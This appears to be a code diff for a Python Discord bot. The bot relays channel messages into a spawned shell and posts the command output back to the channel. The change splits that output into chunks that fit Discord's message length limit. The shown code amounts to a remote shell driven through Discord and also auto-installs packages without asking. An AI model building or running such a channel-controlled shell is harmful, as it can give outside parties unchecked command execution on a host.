@@ -1,6 +1,7 @@
 import subprocess
 import threading
 import platform
+MAX_RESPONSE_LENGTH = 1980
 
 try:
     import discord
@@ -10,7 +11,6 @@ except ImportError:
     subprocess.run(['pip', 'install', 'discord.py', 'asyncio'], check=True)
     import discord
     import asyncio
-
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -65,7 +65,11 @@ async def on_message(message):
             shell.stdin.flush()
             await asyncio.sleep(1)
             temp_output = " \n".join(output)
-            await message.channel.send(f"```\n{temp_output}\n```")
             output.clear()
 
-client.run('YOUR_BOT_TOKEN')
+            # Split the output into chunks of MAX_RESPONSE_LENGTH characters or less
+            for i in range(0, len(temp_output), MAX_RESPONSE_LENGTH):
+                chunk = temp_output[i:i + MAX_RESPONSE_LENGTH]
+                await message.channel.send(f"```\n{chunk}\n```")
+
+client.run('<your bot token')
